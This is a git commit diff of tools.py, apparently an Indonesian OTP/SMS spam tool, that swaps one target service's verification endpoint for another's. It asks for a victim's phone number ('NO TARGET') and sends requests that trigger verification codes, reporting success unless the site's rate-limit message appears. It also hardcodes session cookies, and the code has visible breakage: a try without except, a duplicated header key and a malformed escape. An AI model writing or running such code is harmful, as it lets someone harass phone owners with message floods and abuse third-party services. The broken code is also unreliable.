11196863d3ad22b7885144108d437507b9b062a2
TheXmanz <52388234+BangDanz@users.noreply.github.com>
2020-06-29 14:58:38 +0700

    Update tools.py

--- tools.py
+++ tools.py
@@ -158,25 +158,28 @@ def spamer():
         r = requests.post("https://api.sooplai.com/customer/register/otp/request", data=dat, headers=ua)
         print ("\033[1;97mSPAM \033[90m=> \033[1;92mBERHASIL")
     def call():
-        ua = {
-        "Host": "api.myfave.com",
-        "Connection": "keep-alive",
-        "x-user-agent": "Fave-PWA/v1.0.0",
-        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.83 Mobile Safari/537.36",
-        "content-type": "application/json",
-        "Accept": "*/*",
-        "Origin": "https://m.myfave.com",
-        "Referer": "https://m.myfave.com/jakarta/auth",
+        head = {
+        "X-Requested-With": "XMLHttpRequest",
+        "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
+        "Content-Type":" application/x-www-form-urlencoded; charset=UTF-8",
+        "Content-Type": "application/json",
+        "Origin": "https://id.jagreward.com",
+        "Referer": "https://id.jagreward.com/member/register/",
         "Accept-Encoding": "gzip, deflate, br",
-        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+        "__cfduid": "d4de1e7ea2ced09ecde54a568af1ac50b1584709816",
+        "_ga": "GA1.2.2037151396.1584709855",
+        "PHPSESSID": "n88pmtvvsdpf25898a9jeqbggc",
+        "DAPROPS": "sjs.webGlRenderer:PowerVR Rogue GE8320|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:1.75|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:1|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0",
         }
-        dat = {"phone":no}
-        r = requests.post("https://api.myfave.com/api/fave/v3/auth", data=json.dumps(dat), headers=ua).text
-        if "6c047709f9da4291a568fa84b97b6d47" in r:
-            print ("\033[90m> \]33[1;97mSPAM \033[1;94m=> \033[1;91mGAGAL")
-        else:
-            print ("\033[90m> \033[1;97mSPAM \033[1;94m=> \033[1;92mBERHASIL")
-    no = input("\033[1;97mNO TARGET: \033[1;92m")
+        try:
+            r = requests.get("https://id.jagreward.com/member/verify-mobile/"+br+"/", headers=head)   
+            if "Anda telah meminta kode verifikasi melebihi batas yang diizinkan. Harap tunggu sebentar sebelum membuat permintaan kode verifikasi yang lain." in r.text:
+                print ("\033[90m> \]33[1;97mSPAM \033[1;94m=> \033[1;91mGAGAL")
+            else:
+                print ("\033[90m> \033[1;97mSPAM \033[1;94m=> \033[1;92mBERHASIL")
+    no = input("\033[1;97mNO TARGET:\033[90m<(0896×××)> \033[1;92m")
+    br = input("\033[1;97mNO TARGET:\033[90m <(896×××)> \033[1;92m")
     try:
         for i in range(1):
             rupa()
